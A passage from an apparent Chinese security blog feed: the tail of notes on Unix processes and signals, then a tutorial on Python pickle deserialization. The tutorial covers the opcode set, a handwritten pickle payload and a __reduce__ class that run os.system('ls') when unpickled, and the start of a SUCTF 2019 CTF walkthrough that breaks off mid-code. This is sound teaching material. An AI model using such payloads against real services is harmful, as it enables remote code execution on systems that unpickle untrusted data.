信号再次运行。</p></li><li><p>终止：进程永远地停止了。</p><p>  三种原因可使得进程停止：</p><ul><li>收到一个信号，该信号的默认行为是终止进程。</li><li>从主程序返回。</li><li>调用 exit 函数。</li></ul></li></ul><h3 id="获取进程-ID"><a href="#获取进程-ID" class="headerlink" title="获取进程 ID"></a>获取进程 ID</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">pid_t</span> getpid(<span class="keyword">void</span>);</span><br><span class="line"><span class="keyword">pid_t</span> getppid(<span class="keyword">void</span>);</span><br></pre></td></tr></table></figure><h3 id="创建和终止进程"><a href="#创建和终止进程" class="headerlink" title="创建和终止进程"></a>创建和终止进程</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#inlcude <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">pid_t</span> fork(<span class="keyword">void</span>);</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">exit</span><span class="params">(<span class="keyword">int</span> status)</span></span>;</span><br></pre></td></tr></table></figure><h3 id="回收子进程"><a href="#回收子进程" class="headerlink" title="回收子进程"></a>回收子进程</h3><p>当一个进程由于某种原因终止时，内核并不是立即把它从系统中清除。相反，进程被保持在一种已终止的状态中，直到被它的父进程回收（reaped）。当父进程回收已终止的子进程时，内核将子进程的退出状态传递个父进程，然后抛弃已终止进程，从此时开始，该进程才不存在。</p><p>一个终止了但还未被回收的进程成为僵死进程（zombie）。</p><p>僵死进程已经终止了，但内核仍保留着它的某些状态直到父进程回收它为止。</p><p>一个进程可通过调用 <code>waitpid()</code> 来等待它的子进程终止或者停止。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">pid_t</span> waitpid(<span class="keyword">pid_t</span> pid, <span class="keyword">int</span>* statusp, <span class="keyword">int</span> options);</span><br></pre></td></tr></table></figure><p>（TODO：深入整理）</p><h3 id="让进程休眠"><a href="#让进程休眠" class="headerlink" title="让进程休眠"></a>让进程休眠</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">sleep</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> secs)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pause</span><span class="params">(<span class="keyword">void</span>)</span></span>;  <span class="comment">// 休眠至进程接收到一个信号</span></span><br></pre></td></tr></table></figure><h3 id="加载并运行程序"><a href="#加载并运行程序" class="headerlink" title="加载并运行程序"></a>加载并运行程序</h3><p><code>execve</code> 函数在当前进程的上下文加载并运行一个新程序。</p><p>而 fork 函数则是在新的子进程中运行相同的程序，新的子进程是父进程的一个复制品。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">execve</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* filename, <span class="keyword">const</span> <span class="keyword">char</span>** argv, <span class="keyword">const</span> <span class="keyword">char</span>** envp)</span></span>;</span><br></pre></td></tr></table></figure><p>与 fork 一次调用两次返回不同，execve 调用一次并从不返回。</p><h2 id="信号"><a href="#信号" class="headerlink" title="信号"></a>信号</h2><p>一个信号就是一条小消息，它通知进程系统中发生了一个某种类型的时间。在 Linux 上支持了 30 中不同类型的信号。每个信号类型都对应于某种系统事件。</p><p>低层的硬件异常是由内核异常处理程序处理的，正常情况下，对用户进程而言是不可见的。</p><p>信号提供了一种机制，通知余户进程发生了这些异常。</p><h3 id="发送"><a href="#发送" class="headerlink" title="发送"></a>发送</h3><p>内核通过更新目的进程上下文中的某个状态，发送一个信号给目的进程。</p><p>发送信号可以有如下两种原因：</p><ul><li>内核检测到一个系统事件，比如除零错误或者子进程终止。</li><li>一个进程调用了 kill 函数，显示地要求内核发送一个信号给目的进程。</li></ul><p>一个进程可以发送信号给它自己。</p><p><strong>Unix 系统发送信号的机制</strong></p><ul><li><p>进程组</p><p>  每个进程都只属于一个进程组，进程组是由一个正整数进程组 ID 来标识的。</p><p>  默认一个子进程和它父进程同属于一个进程组。</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">pid_t</span> getpgrp(<span class="keyword">void</span>);  <span class="comment">// 返回调用进程的进程组 ID</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">setpgid</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">pid_t</span> pgid)</span></span>;  <span class="comment">// 设置进程组成功返回 0，否则为 -1</span></span><br></pre></td></tr></table></figure></li><li><p>用 <code>/bin/kill</code> 程序</p>  <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kill -9 1023# 杀掉 1023 进程</span><br><span class="line">kill -9 -1023# 杀掉 1023 进程组的每个进程</span><br></pre></td></tr></table></figure></li><li><p>从键盘发送</p><p>  CTRL + C / Z  ：终止 / 挂起</p></li><li><p>用 kill 函数</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">kill</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">int</span> sig)</span></span>;</span><br></pre></td></tr></table></figure></li><li><p>用 alarm 函数发送</p><p>  进程可通过调用 alarm 函数向自己发送 SIGALRM 信号，网络编程中可拿来处理超时。</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">alarm</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> secs)</span></span>;</span><br></pre></td></tr></table></figure></li></ul><h3 id="接收"><a href="#接收" class="headerlink" title="接收"></a>接收</h3><p>当目的进程被内核强迫以某种方式对信号的发送做出反应时，它就接收了信号。进程可以忽略这个信号，终止或者通过执行一个信号处理函数的用户层函数捕获这个信号。</p><h3 id="处理"><a href="#处理" class="headerlink" title="处理"></a>处理</h3><h2 id="操作进程的工具"><a href="#操作进程的工具" class="headerlink" title="操作进程的工具"></a>操作进程的工具</h2><ul><li><p>strace</p><p>  打印一个正在运行的程序和它的子进程调用的每个系统调用的轨迹。</p><p>  这是一个超级牛逼的工具，比如你想跟进 PHP 内核底层实现，这就能收获大量信息。</p></li><li><p>ps</p><p>  列出当前系统中的进程（包括僵尸进程）。</p></li><li><p>top</p><p>  打印出关于当前进程资源使用的信息。</p></li><li><p>pmap</p><p>  显示进程的内存映射。</p></li><li><p>/proc</p><p>  一个虚拟文件系统，以 ASCII 文本格式输出大量内核数据结构的内容（从这也能感受到 Linux 文件的重要性），用户程序可以读取这些内容。</p><p>  （TODO：补充详细结构及其作用）</p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;异常&quot;&gt;&lt;a href=&quot;#异常&quot; class=&quot;headerlink&quot; title=&quot;异常&quot;&gt;&lt;/a&gt;异常&lt;/h2&gt;&lt;p&gt;异常是异常控制流的一种形式，它一部分由硬件实现，一部分由操作系统实现。&lt;/p&gt;
&lt;h2 id=&quot;进程&quot;&gt;&lt;a href=&quot;#进程&quot; clas
      
    
    </summary>
    
    
      <category term="读书笔记" scheme="https://wywwzjj.top/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>Python pickle 反序列化实例分析</title>
    <link href="https://wywwzjj.top/2019/10/24/Python-pickle-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90/"/>
    <id>https://wywwzjj.top/2019/10/24/Python-pickle-反序列化实例分析/</id>
    <published>2019-10-24T02:26:07.000Z</published>
    <updated>2019-11-04T02:27:17.021Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前 SUCTF 出了一题 pickle 反序列化的杂项题，就感觉相当有意思。后来 Balsn 一次性搞了三个，太强了，学到了很多，感谢这些师傅。下文记录了我的学习笔记以及踩过的坑，希望对大家理解 pickle 有点帮助。</p><p>这个 PPT 一定要好好看看，非常的通俗易懂。<br><a href="https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf" target="_blank" rel="noopener">https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf</a></p><h2 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h2><blockquote><p>Python 提供了两个库，pickle 和 cPickle（其中 cpickle 底层使用 c 语言书写）</p><p>用 pycharm 调试的话需要更改一下代码，pyckle.py 的第 1607 行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="comment"># Use the faster _pickle if possible</span></span><br><span class="line">&gt; <span class="keyword">try</span>:</span><br><span class="line">&gt;     <span class="keyword">from</span> _pickle <span class="keyword">import</span> ( ...  <span class="comment"># 这里 _pickle =&gt; pickle</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><h3 id="序列化过程"><a href="#序列化过程" class="headerlink" title="序列化过程"></a>序列化过程</h3><ul><li>从对象中提取所有属性（<code>__dict__</code>），并将属性转为键值对</li><li>写入对象的类名</li><li>写入键值对</li></ul><h3 id="反序列化过程"><a href="#反序列化过程" class="headerlink" title="反序列化过程"></a>反序列化过程</h3><ul><li>获取 pickle 输入流</li><li>重建属性列表</li><li>根据保存的类名创建一个新的对象</li><li>将属性复制到新的对象中</li></ul><h2 id="pickle-是什么？"><a href="#pickle-是什么？" class="headerlink" title="pickle 是什么？"></a>pickle 是什么？</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>pickle 是一种栈语言，有不同的编写方式，基于一个轻量的 PVM（Pickle Virtual Machine）。</p><p>PVM 由三部分组成：</p><ul><li><p><strong>指令处理器</strong></p><p>  从流中读取 opcode 和参数，并对其进行解释处理。重复这个动作，直到遇到 <code>.</code> 这个结束符后停止。</p><p>  最终留在栈顶的值将被作为反序列化对象返回。</p></li><li><p><strong>stack</strong></p><p>  由 Python 的 <strong>list</strong> 实现，被用来临时存储数据、参数以及对象。</p></li><li><p><strong>memo</strong></p><p>  由 Python 的 <strong>dict</strong> 实现，为 PVM 的整个生命周期提供存储。</p></li></ul><p><strong>PS</strong>：注意下 stack、memo 的实现方式，方便理解下面的指令。</p><blockquote><p>当前用于 pickling 的协议共有 5 种。使用的协议版本越高，读取生成的 pickle 所需的 Python 版本就要越新。</p><ul><li>v0 版协议是原始的 “人类可读” 协议，并且向后兼容早期版本的 Python。</li><li>v1 版协议是较早的二进制格式，它也与早期版本的 Python 兼容。</li><li>v2 版协议是在 Python 2.3 中引入的。它为存储 <a href="https://docs.python.org/zh-cn/3/glossary.html#term-new-style-class" target="_blank" rel="noopener">new-style class</a> 提供了更高效的机制。欲了解有关第 2 版协议带来的改进，请参阅 <a href="https://www.python.org/dev/peps/pep-0307" target="_blank" rel="noopener"><strong>PEP 307</strong></a>。</li><li>v3 版协议添加于 Python 3.0。它具有对 <a href="https://docs.python.org/zh-cn/3/library/stdtypes.html#bytes" target="_blank" rel="noopener"><code>bytes</code></a> 对象的显式支持，且无法被 Python 2.x 打开。这是目前默认使用的协议，也是在要求与其他 Python 3 版本兼容时的推荐协议。</li><li>v4 版协议添加于 Python 3.4。它支持存储非常大的对象，能存储更多种类的对象，还包括一些针对数据格式的优化。有关第 4 版协议带来改进的信息，请参阅 <a href="https://www.python.org/dev/peps/pep-3154" target="_blank" rel="noopener"><strong>PEP 3154</strong></a>。</li></ul></blockquote><h3 id="指令集"><a href="#指令集" class="headerlink" title="指令集"></a>指令集</h3><blockquote><p>本文重点说明 0 号协议，不明白的指令建议直接看对应实现！</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">MARK           = <span class="string">b'('</span>   <span class="comment"># push special markobject on stack</span></span><br><span class="line">STOP           = <span class="string">b'.'</span>   <span class="comment"># every pickle ends with STOP</span></span><br><span class="line">POP            = <span class="string">b'0'</span>   <span class="comment"># discard topmost stack item</span></span><br><span class="line">POP_MARK       = <span class="string">b'1'</span>   <span class="comment"># discard stack top through topmost markobject</span></span><br><span class="line">DUP            = <span class="string">b'2'</span>   <span class="comment"># duplicate top stack item</span></span><br><span class="line">FLOAT          = <span class="string">b'F'</span>   <span class="comment"># push float object; decimal string argument</span></span><br><span class="line">INT            = <span class="string">b'I'</span>   <span class="comment"># push integer or bool; decimal string argument</span></span><br><span class="line">BININT         = <span class="string">b'J'</span>   <span class="comment"># push four-byte signed int</span></span><br><span class="line">BININT1        = <span class="string">b'K'</span>   <span class="comment"># push 1-byte unsigned int</span></span><br><span class="line">LONG           = <span class="string">b'L'</span>   <span class="comment"># push long; decimal string argument</span></span><br><span class="line">BININT2        = <span class="string">b'M'</span>   <span class="comment"># push 2-byte unsigned int</span></span><br><span class="line">NONE           = <span class="string">b'N'</span>   <span class="comment"># push None</span></span><br><span class="line">PERSID         = <span class="string">b'P'</span>   <span class="comment"># push persistent object; id is taken from string arg</span></span><br><span class="line">BINPERSID      = <span class="string">b'Q'</span>   <span class="comment">#  "       "         "  ;  "  "   "     "  stack</span></span><br><span class="line">REDUCE         = <span class="string">b'R'</span>   <span class="comment"># apply callable to argtuple, both on stack</span></span><br><span class="line">STRING         = <span class="string">b'S'</span>   <span class="comment"># push string; NL-terminated string argument</span></span><br><span class="line">BINSTRING      = <span class="string">b'T'</span>   <span class="comment"># push string; counted binary string argument</span></span><br><span class="line">SHORT_BINSTRING= <span class="string">b'U'</span>   <span class="comment">#  "     "   ;    "      "       "      " &lt; 256 bytes</span></span><br><span class="line">UNICODE        = <span class="string">b'V'</span>   <span class="comment"># push Unicode string; raw-unicode-escaped'd argument</span></span><br><span class="line">BINUNICODE     = <span class="string">b'X'</span>   <span class="comment">#   "     "       "  ; counted UTF-8 string argument</span></span><br><span class="line">APPEND         = <span class="string">b'a'</span>   <span class="comment"># append stack top to list below it</span></span><br><span class="line">BUILD          = <span class="string">b'b'</span>   <span class="comment"># call __setstate__ or __dict__.update()</span></span><br><span class="line">GLOBAL         = <span class="string">b'c'</span>   <span class="comment"># push self.find_class(modname, name); 2 string args</span></span><br><span class="line">DICT           = <span class="string">b'd'</span>   <span class="comment"># build a dict from stack items</span></span><br><span class="line">EMPTY_DICT     = <span class="string">b'&#125;'</span>   <span class="comment"># push empty dict</span></span><br><span class="line">APPENDS        = <span class="string">b'e'</span>   <span class="comment"># extend list on stack by topmost stack slice</span></span><br><span class="line">GET            = <span class="string">b'g'</span>   <span class="comment"># push item from memo on stack; index is string arg</span></span><br><span class="line">BINGET         = <span class="string">b'h'</span>   <span class="comment">#   "    "    "    "   "   "  ;   "    " 1-byte arg</span></span><br><span class="line">INST           = <span class="string">b'i'</span>   <span class="comment"># build &amp; push class instance</span></span><br><span class="line">LONG_BINGET    = <span class="string">b'j'</span>   <span class="comment"># push item from memo on stack; index is 4-byte arg</span></span><br><span class="line">LIST           = <span class="string">b'l'</span>   <span class="comment"># build list from topmost stack items</span></span><br><span class="line">EMPTY_LIST     = <span class="string">b']'</span>   <span class="comment"># push empty list</span></span><br><span class="line">OBJ            = <span class="string">b'o'</span>   <span class="comment"># build &amp; push class instance</span></span><br><span class="line">PUT            = <span class="string">b'p'</span>   <span class="comment"># store stack top in memo; index is string arg</span></span><br><span class="line">BINPUT         = <span class="string">b'q'</span>   <span class="comment">#   "     "    "   "   " ;   "    " 1-byte arg</span></span><br><span class="line">LONG_BINPUT    = <span class="string">b'r'</span>   <span class="comment">#   "     "    "   "   " ;   "    " 4-byte arg</span></span><br><span class="line">SETITEM        = <span class="string">b's'</span>   <span class="comment"># add key+value pair to dict</span></span><br><span class="line">TUPLE          = <span class="string">b't'</span>   <span class="comment"># build tuple from topmost stack items</span></span><br><span class="line">EMPTY_TUPLE    = <span class="string">b')'</span>   <span class="comment"># push empty tuple</span></span><br><span class="line">SETITEMS       = <span class="string">b'u'</span>   <span class="comment"># modify dict by adding topmost key+value pairs</span></span><br><span class="line">BINFLOAT       = <span class="string">b'G'</span>   <span class="comment"># push float; arg is 8-byte float encoding</span></span><br><span class="line"></span><br><span class="line">TRUE           = <span class="string">b'I01\n'</span>  <span class="comment"># not an opcode; see INT docs in pickletools.py</span></span><br><span class="line">FALSE          = <span class="string">b'I00\n'</span>  <span class="comment"># not an opcode; see INT docs in pickletools.py</span></span><br></pre></td></tr></table></figure><h2 id="如何生成-pickle？"><a href="#如何生成-pickle？" class="headerlink" title="如何生成 pickle？"></a>如何生成 pickle？</h2><h3 id="手写"><a href="#手写" class="headerlink" title="手写"></a>手写</h3><p>基本模式：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c<span class="tag">&lt;<span class="name">module</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">callable</span>&gt;</span></span><br><span class="line">(<span class="tag">&lt;<span class="name">args</span>&gt;</span></span><br><span class="line">tR</span><br></pre></td></tr></table></figure><p>看个小例子：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">cos</span><br><span class="line">system</span><br><span class="line">(S<span class="string">'ls'</span></span><br><span class="line">tR.</span><br><span class="line"></span><br><span class="line">&lt;=&gt; __import__('os').system(*('ls',))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分解一下：</span></span><br><span class="line">cos</span><br><span class="line">system  =&gt;  引入 system，并将函数添加到 stack</span><br><span class="line"></span><br><span class="line">(S'ls'=&gt;  把当前 stack 存到 metastack，清空 stack，再将 'ls' 压入 stack</span><br><span class="line">t=&gt;  stack 中的值弹出并转为 tuple，把 metastack 还原到 stack，再将 tuple 压入 stack</span><br><span class="line"><span class="comment"># 简单来说，(,t 之间的内容形成了一个 tuple，stack 目前是 [&lt;built-in function system&gt;, ('ls',)]</span></span><br><span class="line">R =&gt;  system(*('ls',))</span><br><span class="line">.=&gt;  结束，返回当前栈顶元素</span><br></pre></td></tr></table></figure><h3 id="reduce"><a href="#reduce" class="headerlink" title="_reduce_"></a>_<em>reduce_</em></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os, pickle</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(<span class="string">'ls'</span>,))</span><br><span class="line">    </span><br><span class="line">print(pickle.dumps(Test(), protocol=<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">b'cnt\nsystem\np0\n(Vls\np1\ntp2\nRp3\n.'</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><p>缺点：只能执行单一的函数，很难构造复杂的操作，下文的讲解都是直接写。</p><h2 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h2><h3 id="SUCTF-2019-Guess-game"><a href="#SUCTF-2019-Guess-game" class="headerlink" title="SUCTF 2019 Guess_game"></a>SUCTF 2019 Guess_game</h3><blockquote><p>完整源码：<a href="https://github.com/team-su/SUCTF-2019/tree/master/Misc/guess_game" target="_blank" rel="noopener">https://github.com/team-su/SUCTF-2019/tree/master/Misc/guess_game</a></p></blockquote><p>猜数游戏，10 以内的数字，猜对十次就返回 flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># file: Ticket.py</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ticket</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, number)</span>:</span></span><br><span class="line">        self.number = number</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__eq__</span><span class="params">(self, other)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> type(self) == type(other) <span class="keyword">and</span> self.number == other.number:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_valid</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">assert</span> type(self.number) == int</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> number_range &gt;= self.number &gt;= <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">       </span><br><span class="line"><span class="comment"># file: game_client.py</span></span><br><span class="line">number = input(<span class="string">'Input the number you guess\n&gt; '</span>)</span><br><span class="line">ticket = Ticket(number)</span><br><span class="line">ticket = pickle.dumps(ticket)</span><br><span class="line">writer.write(pack_length(len(ticket)))</span><br><span class="line">writer.write(ticket)</span><br></pre></td></tr></table></figure><p>client 端接收数字输入，生成的 Ticket 对象序列化后发送给 server 端。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># file: game_server.py 有删减</span></span><br><span class="line"><span class="keyword">from</span> guess_game.Ticket <span class="keyword">import</span> Ticket</span><br><span class="line"><span class="keyword">from</span> guess_game.RestrictedUnpickler <span class="keyword">import</span> restricted_loads</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> unpack</span><br><span class="line"><span class="keyword">from</span> guess_game <span class="keyword">import</span> game</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> game.finished():</span><br><span class="line">ticket = stdin_read(length)</span><br><span class="line">    ticket = restricted_loads(ticket)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> type(ticket) == Ticket</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> ticket.is_valid():</span><br><span class="line">        print(<span class="string">'The number is invalid.'</span>)</span><br><span class="line">        game.next_game(Ticket(<span class="number">-1</span>))</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    win = game.next_game(ticket)</span><br><span class="line">    <span class="keyword">if</span> win:</span><br><span class="line">        text = <span class="string">"Congratulations, you get the right number!"</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        text = <span class="string">"Wrong number, better luck next time."</span></span><br><span class="line">    print(text)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> game.is_win():</span><br><span class="line">        text = <span class="string">"Game over! You win all the rounds, here is your flag %s"</span> % flag</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        text = <span class="string">"Game over! You got %d/%d."</span> % (game.win_count, game.round_count)</span><br><span class="line">    print(text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># file: RestrictedUnpickler.py  对引入的模块进行检测</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span><span class="params">(pickle.Unpickler)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span><span class="params">(self, module, name)</span>:</span></span><br><span class="line">        <span class="comment"># Only allow safe classes</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"guess_game"</span> == module[<span class="number">0</span>:<span class="number">10</span>] <span class="keyword">and</span> <span class="string">"__"</span> <span class="keyword">not</span> <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">return</span> getattr(sys.modules[module], name)</span><br><span class="line">        <span class="comment"># Forbid everything else.</span></span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">"global '%s.%s' is forbidden"</span> % (module, name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">restricted_loads</span><span 